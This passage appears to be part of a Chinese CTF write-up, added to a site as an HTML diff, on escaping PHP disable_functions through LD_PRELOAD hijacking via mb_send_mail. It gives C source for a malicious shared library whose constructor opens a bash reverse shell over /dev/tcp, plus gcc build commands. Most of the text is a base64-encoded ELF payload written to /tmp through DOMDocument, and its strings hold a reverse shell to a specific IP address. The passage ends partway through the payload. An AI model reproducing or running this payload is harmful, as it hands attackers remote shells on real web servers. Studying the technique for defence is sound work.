+<li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li>
+<li>配合php的某个函数去触发我们的恶意动态链接库文件</li>
+<li>Getshell</li>
+</ol>
+</blockquote>
+<p>这个php的函数很关键。可以使用<code>mail、error_log</code>等，但是这里被禁用了</p>
+<p>我们还可以使用<code>mb_send_mail()</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161255923.png" srcset="/img/loading.gif" lazyload alt="image-20230816125548796"></p>
+<p>它是<code>mail()</code>的包装函数，因此也可以进行劫持</p>
+<p>我们需要先编写一个恶意poc.c文件：(用来反弹shell)</p>
+<blockquote>
+<p><code>__attribute__</code>语法格式为：<code>__attribute__ ( ( attribute-list ) )</code><br>若函数被设定为constructor属性，则<strong>该函数会在main（）函数执行之前被自动的执行</strong>。类似的，若函数被设定为destructor属性，<br>则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">angel</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/7788 0&gt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后编译一下生成恶意动态链接程序poc.so：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">gcc -<span class="hljs-keyword">c</span> -fPIC poc.<span class="hljs-keyword">c</span> -o poc<br>gcc --share poc -o poc.so<br></code></pre></td></tr></table></figure>
+
+<p>然后我们需要把这个文件给上传到服务器上去，并且使用<code>putenv()</code>函数重新设置<code>LD_PRELOAD</code>环境变量，最后使用<code>mb_send_mail()</code>调用恶意的函数进行反弹shell</p>
+<p>但是这里有个问题，我们没权限上传文件，和写文件，相关函数被禁用了。</p>
+<p>这里有一种方法是上传临时文件<code>/tmp/phpxxx</code>，然后使用<code>scandir(&quot;glob:///tmp/php*&quot;)</code>去模糊匹配的</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308161308574.png" srcset="/img/loading.gif" lazyload alt="image-20230816130854508"></p>
+<p>还有另一种方法，使用php原生类<code>DOMDocument</code>写文件：</p>
+<blockquote>
+<p>可以参考：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#domdocument">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#domdocument</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-variable">$f</span>=<span class="hljs-string">&quot;/tmp/poc.so&quot;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">loadHTML</span>(<span class="hljs-string">&quot;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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXFLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXKLwAA/yXMLwAADx9AAP8lyi8AAGgAAAAA6eD/////JcIvAABoAQAAAOnQ/////yWKLwAAZpAAAAAAAAAAAEiNPbEvAABIjQWqLwAASDn4dBVIiwVOLwAASIXAdAn/4A8fgAAAAADDDx+AAAAAAEiNPYEvAABIjTV6LwAASCn+SInwSMHuP0jB+ANIAcZI0f50FEiLBR0vAABIhcB0CP/gZg8fRAAAww8fgAAAAADzDx76gD09LwAAAHUrVUiDPfouAAAASInldAxIiz0eLwAA6Fn////oZP///8YFFS8AAAFdww8fAMMPH4AAAAAA8w8e+ul3////VUiJ5UiNBdwOAABIice4AAAAAOgP////SI0F2A4AAEiJx7gAAAAA6Ov+//+QXcNIg+wISIPECMMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMRF9QUkVMT0FEAAAAAAAAYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzUuMTA4LjE1Lzc3ODggMD4mMScAAAABGwM7JAAAAAMAAADY7///QAAAAAjw//9oAAAA0fD//4AAAAAAAAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAACQ7///MAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAAmO///wgAAAAAAAAAAAAAABwAAABcAAAASfD//y8AAAAAQQ4QhgJDDQZqDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA